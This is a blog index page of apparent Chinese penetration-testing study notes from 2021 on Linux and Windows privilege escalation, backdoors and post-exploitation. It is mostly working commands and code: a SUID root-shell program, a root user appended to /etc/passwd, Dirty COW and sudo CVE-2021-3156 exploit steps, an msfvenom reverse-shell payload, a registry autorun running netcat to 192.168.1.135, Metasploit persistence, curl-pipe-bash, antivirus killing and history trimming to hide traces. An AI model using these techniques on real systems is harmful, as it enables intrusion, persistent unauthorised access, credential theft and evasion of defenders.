<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.0.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-linux后门植入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" class="article-date">
  <time datetime="2021-08-03T03:57:14.000Z" itemprop="datePublished">2021-08-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/">linux后门植入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="用脚本探测linux提权漏洞"><a href="#用脚本探测linux提权漏洞" class="headerlink" title="用脚本探测linux提权漏洞"></a>用脚本探测linux提权漏洞</h2><h4 id="windows漏洞探测脚本"><a href="#windows漏洞探测脚本" class="headerlink" title="windows漏洞探测脚本:"></a>windows漏洞探测脚本:</h4><p>python2和python3的区别:</p>
<p><strong>python2 打印函数print不需要括号: print “hello”;python3打印函数需要print(“hello”)</strong></p>
<p>python2-pip安装:</p>
<p>python2 get-pip.py</p>
<p>python3-pip安装:</p>
<p>apt-get install python3-pip</p>
<p>脚本使用:</p>
<p>漏洞库位置: <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-022">https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-022</a></p>
<p>下载漏洞库:  python2 windows-exploit-suggester.py –update</p>
<p>保存systeminfo信息: systeminfo &gt; sys.txt</p>
<p>探测漏洞: python2 windows-exploit-suggester.py -i sys.txt -d 2021-03-28-mssb.xls</p>
<h4 id="linux脚本探测"><a href="#linux脚本探测" class="headerlink" title="linux脚本探测:"></a>linux脚本探测:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下载:</span><br><span class="line">github: https:&#x2F;&#x2F;github.com&#x2F;mzet-&#x2F;linux-exploit-suggester</span><br><span class="line">下载: </span><br><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;mzet-&#x2F;linux-exploit-suggester&#x2F;master&#x2F;linux-exploit-suggester.sh -O les.sh</span><br><span class="line">运行:</span><br><span class="line">.&#x2F;les.sh</span><br></pre></td></tr></table></figure>

<h2 id="linux后门植入"><a href="#linux后门植入" class="headerlink" title="linux后门植入"></a>linux后门植入</h2><h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务:"></a>计划任务:</h5><ol>
<li><p>用命令的方式写计划任务</p>
<p>crontab -e </p>
<p>crontab -l     –&gt; 查看计划任务</p>
</li>
<li><p>再文件中写入计划任务</p>
<p>文件位置: /etc/crontab</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute(分钟) (0 - 59)</span><br><span class="line"># |  .------------- hour(小时) (0 - 23)</span><br><span class="line"># |  |  .---------- day of month(每月的天数) (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12)(月份) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (每周的天数)(Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line"></span><br><span class="line">* --&gt; 任意时间</span><br><span class="line">&#x2F; --&gt; 时间频率     *&#x2F;1 * * * * --&gt; 任意时间每隔1分钟执行一次</span><br><span class="line">- --&gt; 区间        0-20&#x2F;2 * * * * --&gt; 0-20分钟每隔两分钟执行一次</span><br><span class="line">, --&gt; 列表范围       1,5,7,9 * * * * --&gt; 第1,5,7,9分钟的之后执行一次</span><br></pre></td></tr></table></figure>

<p>命令的形式:</p>
<p>创建计划任务: crontab -e –&gt; * * * * * command</p>
<p>删除计划任务: crontab -r  | crontab -ri    –&gt; -r 删除 -i 交互(问你是否删除)</p>
<h5 id="创建suid后门"><a href="#创建suid后门" class="headerlink" title="创建suid后门:"></a>创建suid后门:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp: 存放临时文件的目录,具有高权限</span><br><span class="line">1. </span><br><span class="line">创建suid.c</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">main()&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">&#125;</span><br><span class="line">编译:</span><br><span class="line">gcc suid.c -o suid</span><br><span class="line">权限赋予:</span><br><span class="line">chmod 4777 suid</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">复制&#x2F;bin&#x2F;bash &gt; &#x2F;tmp&#x2F;shell</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure>

<h5 id="etc-passwd后门"><a href="#etc-passwd后门" class="headerlink" title="/etc/passwd后门:"></a>/etc/passwd后门:</h5><p>生成有效密码: openssl passwd 密码</p>
<p>插入有效数据: echo 用户名:密码:0:0:system:/root:/bin/bash</p>
<p>登入用户:su 用户名</p>
<p>┌─[✗]─[ilu@parrot]─[/tmp]<br>            └──╼ $su hello<br>                密码：<br>        ┌─[root@parrot]─[/tmp]<br>        └──╼ #</p>
<h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;原数量(默认1000)&#x2F;HISTSIZE&#x3D;目标数量&#x2F;&#39; ~&#x2F;.bashrc</span><br><span class="line">-i 进入到编辑模式</span><br><span class="line">s  替换模式</span><br><span class="line">d  删除模式</span><br><span class="line">g  全局匹配</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckrvjdwcd0007lwvjgczado6f" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-linux提权" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/08/01/linux%E6%8F%90%E6%9D%83/" class="article-date">
  <time datetime="2021-08-01T07:25:43.000Z" itemprop="datePublished">2021-08-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/01/linux%E6%8F%90%E6%9D%83/">linux提权</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>metasplitable2:msfadmin/msfadmin</p>
<p>searchsploit: 查找漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux木马生成:</span><br><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.135 lport&#x3D;4444 -f elf -o shell.elf</span><br></pre></td></tr></table></figure>

<h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>suid:默认会以特权用户的权限去执行</p>
<p>s:特权用户</p>
<p>加入有suid文件可以进入交互模式,那么就可以用提权或者做后门.</p>
<p>less | more | tail</p>
<p>apt | apt-get….</p>
<p>提权步骤:</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null –&gt; 查找具有suid权限的文件</p>
<p>以find命令为例:</p>
<p>find /etc/passwd -exec /bin/bash -p ;  –&gt; 利用文件进入root权限的bash</p>
<figure class="highlight plain"><figcaption><span>https://gtfobins.github.io/</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>文件权限:<br>-:代表文件<br>l:代表链接(软链接–&gt;快捷方式;硬链接–&gt;复制了一份源文件)<br>d:代表目录<br>r 4:可读(read)<br>w 2:可写(write)<br>x 1:可执行(execution)</p>
<p>d rwx r-x r-x<br>d:目录<br>rwx:当前用户的权限<br>r-x:当前用户组的权限<br>r-x:其他用户组的权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 内核提权漏洞</span><br><span class="line"></span><br><span class="line">脏牛漏洞:</span><br><span class="line"></span><br><span class="line">exp: https:&#x2F;&#x2F;github.com&#x2F;FireFart&#x2F;dirtycow&#x2F;blob&#x2F;master&#x2F;dirty.c</span><br><span class="line"></span><br><span class="line">1.上传脏牛到靶机</span><br><span class="line"></span><br><span class="line">2.对脏牛漏洞进行编译:</span><br><span class="line"></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">3.使用漏洞</span><br><span class="line"></span><br><span class="line">chmod u+x dirty</span><br><span class="line"></span><br><span class="line">.&#x2F;dirty 123123 &lt;-- 自定义的密码, 默认用户是firefart</span><br><span class="line"></span><br><span class="line">4.换源&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">#### 利用sudo提权</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>漏洞探测:<br>    用户可以使用非root的账户登录系统，运行“ sudoedit -s / ”命令，<br>    若返回如图以“ sudoedit：”开头的错误，则当前系统可能存在安全风险。<br>    不受影响的系统将显示以“ usage：”开头的错误响应。</p>
<p>影响范围:<br>Sudo 1.8.2 - 1.8.31p2<br>Sudo 1.9.0 - 1.9.5p1</p>
<p>poc地址: <a target="_blank" rel="noopener" href="https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz">https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</a></p>
<p>利用:<br>wget <a target="_blank" rel="noopener" href="https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz">https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</a><br>tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz<br>cd CVE-2021-3156<br>chmod u+x *<br>make<br>./sudo-hax-me-a-sandwich 0</p>
<pre><code>
linux漏洞库: 

https://github.com/qazbnm456/awesome-cve-poc

https://github.com/SecWiki/linux-kernel-exploits



shellcode: 机器码(二进制,十六进制)
</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckrvjdwce0008lwvj82s9epdi" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-windows后门植入和linux信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
  <time datetime="2021-07-28T13:40:14.000Z" itemprop="datePublished">2021-07-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">windows后门植入和linux信息搜集</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="windows后门植入"><a href="#windows后门植入" class="headerlink" title="windows后门植入"></a>windows后门植入</h1><p>持久化的监听:</p>
<p>handle:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-H    配置RHOST&#x2F;LHOST(用于监听)</span><br><span class="line">-P    配置RPORT&#x2F;LPORT(用于监听)</span><br><span class="line">-e    指定编码,连接时会对stage进行编码</span><br><span class="line">-p    指定一个payload</span><br><span class="line">-x    加上这个参数,后台监听就会关闭</span><br></pre></td></tr></table></figure>



<h2 id="持久化后门"><a href="#持久化后门" class="headerlink" title="持久化后门"></a>持久化后门</h2><p><strong>msf中的持久化后门:</strong></p>
<p>run persistence</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-A 自动开启匹配的监听器等待用户连接</span><br><span class="line">-P 指定payload,默认windows/meterpreter/reverse_tcp</span><br><span class="line">-S 开机的时候以服务的方式去运行后门(system权限)</span><br><span class="line">-T 指定一个模板</span><br><span class="line">-U 用户登入的时候做一个反弹</span><br><span class="line">-X 当系统运行的时候做一个反弹</span><br><span class="line">-i 时间间隔(每隔几秒反弹一次)</span><br><span class="line">-p 指定监听的端口</span><br><span class="line">-r 监听器ip</span><br></pre></td></tr></table></figure>

<p><code>example:  run persistence -U -X -i -r LHOST -p LPORT</code></p>
<p>其他的persistence模块: search persistence</p>
<p>自启动后门:</p>
<p><code>注册表的方式&#123;自启动路径很多&#125;、服务的方式&#123;sc 创建服务&#125;、自启动文件夹&#123;shell:startup&#125;,计划任务(只能反弹一次,在指定的时间反弹)</code></p>
<p><code>注册表的方式: reg add HKLM\.... /v xxx /f /d nc 192.168.1.135 4444 -e cmd</code></p>
<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>id    查看当前的用户所在的组别信息</p>
<p>uname -a     查看内核版本的全部信息</p>
<p>cat /proc/version    查看内核版本的全部信息</p>
<p>cat /etc/*release        查看发行版信息</p>
<p>dpkg -l                         查看安装包(根据安装的包的版本找漏洞)</p>
<p>crontab                        计划任务</p>
<p>​    1.指令的方式: crontab -e 计划任务的内容</p>
<p>​    2.以文件的形式写计划任务: /etc/crontab ,以这种方式写计划任务,指令看不到内容</p>
<p>/sbin/ifconfig            查看网络的配置信息</p>
<p>cat /etc/passwd        普通用户可以查看,内容是账号密码信息(密码放在shadow里)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">LOGNAME:PASSWORD:UID:GID:USERINFO:HOME:SHELL</span><br><span class="line"></span><br><span class="line">root    用户名</span><br><span class="line">x        占位符--&gt;密码</span><br><span class="line">0        uid</span><br><span class="line">0        gid</span><br><span class="line">root    描述信息</span><br><span class="line">&#x2F;root    家目录</span><br><span class="line">&#x2F;bin&#x2F;bash    执行环境</span><br></pre></td></tr></table></figure>

<p>cat /etc/shadow        特权用户才能查看,存放账号密码信息</p>
<p>cat /root/.mysql_history    查看数据库历史操作记录</p>
<p>​    <code>数据库: 查看数据库内容,读取文件,上传文件,提取</code></p>
<p>cat /root/.bash_history        查看历史操作记录</p>
<p>find / -perm -u=s -type f 2&gt;/dev/nul    查找具有suid应用程序(默认以root权限执行的程序)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find     指令</span><br><span class="line">&#x2F;         根目录(查找位置)</span><br><span class="line">-perm     权限</span><br><span class="line">-u        用户(s&#x3D;特权)</span><br><span class="line">-type    类型</span><br><span class="line">f        文件</span><br><span class="line">2&gt;&#x2F;dev&#x2F;nul    过滤错误信息(不显示错误信息)</span><br></pre></td></tr></table></figure>

<p>​    </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckrvjdwcg000alwvjbz7vhan0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-windows提权" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/26/windows%E6%8F%90%E6%9D%83/" class="article-date">
  <time datetime="2021-07-26T03:28:49.000Z" itemprop="datePublished">2021-07-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/26/windows%E6%8F%90%E6%9D%83/">windows提权</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>uac提权</strong></p>
<p><strong>bypassuac提权</strong></p>
<p><strong>windows本地提权</strong></p>
<p><strong>令牌盗用</strong></p>
<p>令牌盗用的要求:windows  7之前,及windows 2008之前都可以使用</p>
<p>use incognito</p>
<p>list_tokens -u    列出在线的用户名</p>
<p>假如<code>Impersonation Tokens Available</code>中有system,administrator的用户</p>
<p>那么就可以用<code>impersonate_token 用户名</code>的方式盗用身份</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拓展模块的使用:load,use</span><br><span class="line">每次加载了拓展模块,都可以用help查看相对应的帮助信息</span><br></pre></td></tr></table></figure>

<p><strong>windows提权漏洞库:</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>        (msf使用的漏洞库)</p>
<p><strong>系统服务权限配置错误导致的提权:</strong></p>
<p>​    exp: <code>exploit/windows/local/service_permissions</code></p>
<p>aggressive：</p>
<p>  true ：尽可能多的利用每一个有缺陷的服务<br>            false：第一次提权成功后就会停止工作</p>
<p><strong>利用AlwaysinstallElevated提权</strong></p>
<p>打开组策略进行配置：<br>            win + r –&gt; gpedit.msc<br>            计算机配置-&gt;管理模板-&gt;windows组件-&gt;windows installer-&gt;开启：永远以最高权限进<br>            行安装<br>            用户配置-&gt;管理模板-&gt;windows组件-&gt;windows installer-&gt;开启：永远以最高权限进行<br>            安装</p>
<p>exp: <code>exploit/windows/local/always_install_elevated</code></p>
<p>windows中的权限: trustedinstaller &gt; system &gt; administrator &gt; normal user</p>
<p><strong>可信任服务路径提权:</strong></p>
<p>exp: <code>windows/local/unquoted_service_path</code></p>
<h2 id="windows后渗透模块"><a href="#windows后渗透模块" class="headerlink" title="windows后渗透模块"></a>windows后渗透模块</h2><p><strong>hashdump报错:</strong> </p>
<p>​    <code>解决办法--&gt; 进程迁移</code></p>
<ol>
<li><p>hashdump</p>
</li>
<li><p>run post/windows/gather/smart_hashdump</p>
</li>
</ol>
<p>md5密码破解: <a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
<p>md5的特点: 生成的密钥无法还原,但是每次一样的内容生成的密钥是相同的</p>
<p><strong>开启3389端口:</strong></p>
<p>windows只允许单用户登入,如果其他用户想要登入,必须注销当前用户</p>
<p>run post/windows/manage/enable_rdp</p>
<p>开启完后访问3389端口:</p>
<p>在linux中: rdesktop ip</p>
<p>在windows中: mstsc </p>
<h2 id="windows持久化后门"><a href="#windows持久化后门" class="headerlink" title="windows持久化后门"></a>windows持久化后门</h2><p><strong>msf中的持久化后门:</strong></p>
<p>run persistence</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-A 自动开启匹配的监听器等待用户连接</span><br><span class="line">-P 指定payload,默认windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">-S 开机的时候以服务的方式去运行后门(system权限)</span><br><span class="line">-T 指定一个模板</span><br><span class="line">-U 用户登入的时候做一个反弹</span><br><span class="line">-X 当系统运行的时候做一个反弹</span><br><span class="line">-i 时间间隔(每隔几秒反弹一次)</span><br><span class="line">-p 指定监听的端口</span><br><span class="line">-r 指定反弹的ip</span><br></pre></td></tr></table></figure>








      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckrvjdwck000dlwvj8bfg1408" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-meterpreter与提权" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" class="article-date">
  <time datetime="2021-07-24T01:09:21.000Z" itemprop="datePublished">2021-07-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/">meterpreter与提权</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="远程下载文件"><a href="#远程下载文件" class="headerlink" title="远程下载文件"></a>远程下载文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">wget URL</span><br><span class="line">curl URL -o output_file_name</span><br><span class="line">无文件传输:</span><br><span class="line">wget -qO - url | bash</span><br><span class="line">curl url | bash</span><br><span class="line"></span><br><span class="line">windows:</span><br><span class="line">vbs:</span><br><span class="line">set post &#x3D; CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">set shell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;server_ip&#x2F;fileName(要下载的文件）&quot;,0</span><br><span class="line">Post.send()</span><br><span class="line">set aGET &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGET.Mode &#x3D; 3</span><br><span class="line">aGET.Type &#x3D; 1</span><br><span class="line">aGET.Open()</span><br><span class="line">aGET.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;路径+要保存的名字 (c:\xx.exe)&quot;,2</span><br><span class="line">执行: cscript xxx.vbs</span><br><span class="line"></span><br><span class="line">powershell:</span><br><span class="line">powershell -exec bypass -c (New-Object System.Net.WebClient).DownloadFile(&#39;URL&#x2F;文件名&#39;,&#39;要保存的路径&#x2F;文件名&#39;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>后渗透模块:POST    </p>
<p>漏洞探测:    </p>
<p>​        应用漏洞{版本漏洞,应用本身的缺陷….}</p>
<p>​        服务漏洞{基于端口、基于系统服务…}</p>
<p>​        系统内核漏洞{提权,cve-2018-8120}</p>
<p>后渗透模块:</p>
<p>​    <strong>show post</strong>                                            查看post模块</p>
<p>​    run windows/manage/killav        关闭杀软</p>
<p>​    windows/manage/enable_rdp    开放3389,(需要特权)</p>
<p>​    ….</p>
<p><strong>提权:</strong></p>
<p>​        uac提权:      user account control 用户账户控制</p>
<p>​                    exploit/windows/local/ask</p>
<p>​                    参数:name,<code>session</code></p>
<p>​        bypassuac:</p>
<p>​                    exploit/windows/local/bypassuac_eventvwr</p>
<p>​                    exploit/windows/local/bypassuac_comhijack </p>
<p>​                    exploit/windows/local/bypassuac_injection</p>
<p>​                    exploit/windows/local/bypassuac_windows_store_filesys</p>
<p>​    本地提权漏洞:</p>
<p>​                    cve-2018-8120:exploit/windows/local/ms18_8120_win32k_privesc</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckrvjdwch000blwvj43wm38bl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-MSF-meterpreter" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/20/MSF-meterpreter/" class="article-date">
  <time datetime="2021-07-20T12:12:07.000Z" itemprop="datePublished">2021-07-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/20/MSF-meterpreter/">MSF--meterpreter</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>  碰到powershell无法执行脚本的情况:</p>
<p>  执行脚本权限（策略）</p>
<ul>
<li><p>Restricted    受限制</p>
</li>
<li><p>allsigned      已分配</p>
</li>
<li><p>Unrestricted 不受限制</p>
</li>
<li><p>remotesigned 远程分配</p>
</li>
<li><p>查看执行策略</p>
<ul>
<li>Get-ExecutionPolicy</li>
</ul>
</li>
<li><p>修改执行策略(需要管理员)</p>
<ul>
<li>Set-ExecutionPolicy unrestricted</li>
</ul>
<p>绕过执行策略:powershell -exec bypass -c comannd</p>
<p>创建文件:copy con filename</p>
<p>con:进入到编辑模式</p>
<p>修改属性:attrib</p>
